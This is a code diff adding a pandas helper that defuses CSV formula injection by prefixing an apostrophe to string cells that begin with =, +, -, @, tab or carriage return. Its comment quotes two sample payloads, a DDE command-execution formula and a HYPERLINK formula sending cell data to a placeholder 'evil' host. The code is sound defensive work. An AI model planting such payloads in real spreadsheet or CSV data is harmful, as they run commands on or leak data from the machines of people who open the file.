@@ -232,3 +232,34 @@ def neutralise_foreign_formulas(wb) -> int:
                 cell.data_type = "s"
                 fixed += 1
     return fixed
+
+
+# The characters a spreadsheet reads as the start of a formula when it opens a
+# CSV. Unlike openpyxl — which makes only a leading ``=`` a formula (see
+# neutralise_foreign_formulas above) — Excel and LibreOffice reading a .csv
+# evaluate a cell that starts with any of these, so a value like
+# ``=cmd|'/c calc'!A1`` or ``=HYPERLINK("http://evil?"&A1,"x")`` carried in the
+# data runs on the opener's machine. This defends the CSV path the openpyxl
+# pass cannot see.
+_CSV_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def neutralise_csv_frame(df: "pd.DataFrame") -> "pd.DataFrame":
+    """Return a copy of *df* safe to serialise with ``DataFrame.to_csv`` for download.
+
+    Any *string* cell that begins with a formula leader gains a single leading
+    apostrophe — the marker Excel and LibreOffice both read as "this is text,
+    not a formula" and do not display. Non-string cells (numbers, dates, NaN)
+    are returned untouched, so numeric columns keep their type.
+
+    Call this on the frame passed to ``to_csv`` for any user-facing download.
+    It is the CSV counterpart to :func:`neutralise_foreign_formulas`, which can
+    only reach the openpyxl/xlsx path. Callers pass the neutralised copy to
+    ``to_csv`` and keep the original for any further in-memory use, so no data
+    consumed downstream gains a stray apostrophe.
+    """
+    def _defuse(v):
+        if isinstance(v, str) and v[:1] in _CSV_FORMULA_LEADERS:
+            return "'" + v
+        return v
+    return df.map(_defuse)
